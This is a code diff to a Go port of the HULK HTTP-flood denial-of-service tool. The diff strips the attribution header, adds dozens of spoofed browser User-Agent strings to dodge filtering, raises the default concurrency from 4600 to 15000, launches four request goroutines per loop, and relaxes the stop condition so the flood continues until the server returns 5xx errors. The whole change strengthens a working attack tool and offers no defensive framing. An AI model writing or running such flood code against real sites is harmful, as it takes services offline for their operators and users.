@@ -1,12 +1,5 @@
 package main
 
-/*
- HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
- Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
- This go program licensed under GPLv3.
- Copyright Alexander I.Grafov <grafov@gmail.com>
-*/
-
 import (
 	"flag"
 	"fmt"
@@ -58,6 +51,39 @@ var (
 		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
 		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
 		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
+		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
+		"Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
+		"Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
+		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
+		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
+		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
+		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)",
+		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
+		"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
+		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15",
+		"Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
+		"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+		"SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)",
+		"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
+		"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+		"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+		"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+		"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+		"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+		"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 	}
 	cur int32
 )
@@ -93,7 +119,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 4600
+		maxproc = 15000
 	}
 
 	u, err := url.Parse(site)
@@ -132,6 +158,9 @@ func main() {
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
+				go httpcall(site, u.Host, data, headers, ss)
+				go httpcall(site, u.Host, data, headers, ss)
+				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
 				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
@@ -147,7 +176,6 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
 				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
@@ -165,7 +193,6 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 
 	var param_joiner string
 	var client = new(http.Client)
-
 	if strings.ContainsRune(url, '?') {
 		param_joiner = "&"
 	} else {
@@ -215,7 +242,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		r.Body.Close()
 		s <- callGotOk
 		if safe {
-			if r.StatusCode >= 400 {
+			if r.StatusCode >= 500 {
 				s <- targetComplete
 			}
 		}
